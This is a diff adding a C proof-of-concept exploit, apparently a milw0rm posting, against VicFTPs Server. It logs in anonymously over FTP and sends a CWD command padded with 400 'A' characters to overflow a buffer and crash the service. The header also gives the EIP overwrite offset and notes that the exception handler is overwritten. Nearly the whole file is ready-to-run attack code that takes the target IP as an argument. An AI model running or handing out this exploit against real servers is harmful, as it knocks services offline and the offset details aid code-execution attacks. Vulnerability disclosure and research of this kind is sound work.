@@ -1,0 +1,91 @@
+/*
+VicFTPs Server CWD Remote Buffer Overflow Vulnerability
+                 DoS Proof of concept
+
+            r0ut3r (writ3r [at] gmail.com)
+
+Thanks to:
+Marsu (Marsupilamipowa [at] hotmail.fr)
+for helping me out with this vulnerability.
+
+Greets Marsu, and Timq.
+
+Description:
+Sending a long argument to CWD will cause VicFTPs Server
+to overwrite memory. EIP is overwritten at 323. The POC
+uses a larger buffer to overwrite exception handler,
+preventing an error message.  
+*/
+
+#include <stdio.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+#define PORT 21
+
+int s;
+struct sockaddr_in sock_addr;
+
+char recvbuf[1024];
+char pwn[450];
+
+int main(int argc, char* argv[])
+{
+      if (argc < 2) {
+        printf("Usage: %s <ip>\n", argv[0]);
+        return 1; }
+
+      if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
+        printf("error with socket\n");
+        return 1; }
+
+      sock_addr.sin_family = AF_INET;
+      sock_addr.sin_addr.s_addr = inet_addr(argv[1]);
+      sock_addr.sin_port = htons(PORT);
+
+      if (connect(s, (struct sockaddr *)&sock_addr, sizeof(struct sockaddr)) == -1) {
+        printf("unable to connect\n");
+        return 1; }
+
+      printf("[+] Connected\n");
+      memset(recvbuf, '\0', 1024);
+      recv(s, recvbuf, 1024, 0);
+
+      char userbuf[50];
+      printf("[+] Sending user...\n");
+      memset(userbuf, '\0', 50);
+      memcpy(userbuf, "USER anonymous\r\n", 18);
+      if (send(s, userbuf, strlen(userbuf), 0) == -1) {
+        printf("unable to send data\n");
+        return 1; }
+
+      memset(recvbuf, '\0', 1024);
+      recv(s, recvbuf, 1024, 0);
+
+      char passbuf[50];
+        printf("[+] Sending pass...\n");
+        memcpy(passbuf, "PASS anonymous\r\n", 18);
+        if (send(s, passbuf, strlen(passbuf), 0) == -1) {
+                printf("unable to send data\n");
+                return 1; }
+      recv(s, recvbuf, 1024, 0);
+
+      printf("[+] Building payload. \n");
+      memset(pwn, '\0', 450);
+      memcpy(pwn, "CWD ", 4);
+      memset(pwn+4, 'A', 400);
+      memcpy(pwn+404, "\r\n", 2);
+
+      printf("[+] Sending payload.\n");
+      if (send(s, pwn, strlen(pwn), 0) == -1) {
+        printf("unable to send data\n");
+        return 1; }
+
+      printf("[!] Boom! crashed?!\n");
+
+      return 0;
+}
+
+// milw0rm.com [2007-02-18]
